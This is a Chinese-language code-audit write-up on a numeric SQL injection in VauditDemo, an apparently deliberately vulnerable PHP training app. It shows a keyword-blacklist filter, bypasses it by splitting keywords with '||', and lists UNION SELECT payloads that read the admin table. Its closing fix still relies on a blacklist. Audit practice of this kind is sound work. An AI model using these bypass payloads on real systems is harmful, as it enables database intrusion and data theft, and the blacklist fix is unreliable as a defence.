# VauditDemo SQL数字型注入

# 什么是SQL注入


![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tNc79gy1fi7lu2cs7bj31by0rkn21.jpg)

# 大局阅读：
## sqlwaf()函数:

```
/* Maybe Bypass尝试绕过*/
function sqlwaf( $str ) {
	//str_ireplace 搜索，replaced with the given replace value
	$str = str_ireplace( "and", "sqlwaf", $str );
	$str = str_ireplace( "or", "sqlwaf", $str );
	$str = str_ireplace( "from", "sqlwaf", $str );
	$str = str_ireplace( "execute", "sqlwaf", $str );
	$str = str_ireplace( "update", "sqlwaf", $str );
	$str = str_ireplace( "count", "sqlwaf", $str );
	$str = str_ireplace( "chr", "sqlwaf", $str );
	$str = str_ireplace( "mid", "sqlwaf", $str );
	$str = str_ireplace( "char", "sqlwaf", $str );
	$str = str_ireplace( "union", "sqlwaf", $str );
	$str = str_ireplace( "select", "sqlwaf", $str );
	$str = str_ireplace( "delete", "sqlwaf", $str );
	$str = str_ireplace( "insert", "sqlwaf", $str );
	$str = str_ireplace( "limit", "sqlwaf", $str );
	$str = str_ireplace( "concat", "sqlwaf", $str );  //字符串统一替换为 sqlwaf
	$str = str_ireplace( "\\", "\\\\", $str );
	$str = str_ireplace( "&&", "", $str );
	$str = str_ireplace( "||", "", $str );  // sel||ect -> select
	$str = str_ireplace( "'", "", $str );   // ' -> /
	$str = str_ireplace( "%", "\%", $str );
	$str = str_ireplace( "_", "\_", $str );
	return $str;
}
```

使用`sel||ect `这种形式可以绕过sqlwaf函数。


# 搜索敏感参数：

正则搜索`from(.*)= \$`

搜到在user/messageDetail.php里

```
if ( !empty( $_GET['id'] ) ) {
    $id = sqlwaf( $_GET['id'] ); //通过get方式获取id参数，通过sqlwaf()函数进行过滤
    //$id = $_GET['id']; id =1 uni||on se||lect 1,2,3,4,5,6,7,8 fro||m admin
    $query = "SELECT * FROM comment WHERE comment_id = $id";
```

# 构造payload：

## order by猜字段:

### 小技巧：

之前在Twitter刷到的一个小技巧：**只需两步**就可以猜到数据库某表的字段

- **先大范围再小范围**

![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tKfTcgy1fi8tp3lgyyj30nw0ymjv5.jpg)

照猫画虎一下：


![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tKfTcgy1fi8u911yjej30wm17gjyo.jpg)

发现确切字段是4。

![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tKfTcgy1fi8ua0uchbj311605gjt0.jpg)



> 之前试过手工注入一个大的数据库字段数很多，有100多，one by one 一个个增加到手软。。。。看来这技巧很实用。
> 
> ---
> MySQL 排序 order by 后面直接加列名或者**列的序号**
> `order by <column_one>, <column_two>; `


---


## union select 猜数据：



payload =`1 uni||on se||lect 1,2,3,4 fr||om admin`
经过sqlwaf过滤后为 `1 union select 1,2,3,4 from admin`

![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tKfTcgy1fi8v4trpvqj31he0bq0ur.jpg)

payload =  `1 uni||on se||lect 1,version(),3,4 fr||om admin`

![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tKfTcgy1fi8v4kw4inj31ii0bo76g.jpg)

payload =  `1 uni||on se||lect *,4 fr||om admin`


![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tKfTcgy1fi8v5obs0sj31kw0ccadb.jpg)

基于编写poc的payload：
payload =  `1 uni||on se||lect 1,md5(233),3,4 fr||om admin`

![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tKfTcgy1fi8veuzcjgj31kw087wg4.jpg)

---

# 修复

敏感字符串统一替换为 `sqlwaf`

```
/* Maybe Bypass尝试绕过*/
//字符串统一替换为 sqlwaf
function sqlwaf( $str ) {
	//str_ireplace 搜索，replaced with the given replace value
	$str = str_ireplace( "and", "sqlwaf", $str );
	$str = str_ireplace( "or", "sqlwaf", $str );
	$str = str_ireplace( "from", "sqlwaf", $str );
	$str = str_ireplace( "execute", "sqlwaf", $str );
	$str = str_ireplace( "update", "sqlwaf", $str );
	$str = str_ireplace( "count", "sqlwaf", $str );
	$str = str_ireplace( "chr", "sqlwaf", $str );
	$str = str_ireplace( "mid", "sqlwaf", $str );
	$str = str_ireplace( "char", "sqlwaf", $str );
	$str = str_ireplace( "union", "sqlwaf", $str );
	$str = str_ireplace( "select", "sqlwaf", $str );
	$str = str_ireplace( "delete", "sqlwaf", $str );
	$str = str_ireplace( "insert", "sqlwaf", $str );
	$str = str_ireplace( "limit", "sqlwaf", $str );
	$str = str_ireplace( "concat", "sqlwaf", $str );  	$str = str_ireplace( "\\", "\\\\", $str );
	$str = str_ireplace( "&&", "sqlwaf", $str );
	$str = str_ireplace( "||", "sqlwaf", $str );  
	$str = str_ireplace( "'", "sqlwaf", $str );   
	$str = str_ireplace( "%", "\%", $str );
	$str = str_ireplace( "_", "\_", $str );
	return $str;
}

```

# 审计思路展示：



![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tKfTcgy1fi8vi6ub5tj30p20limyk.jpg)

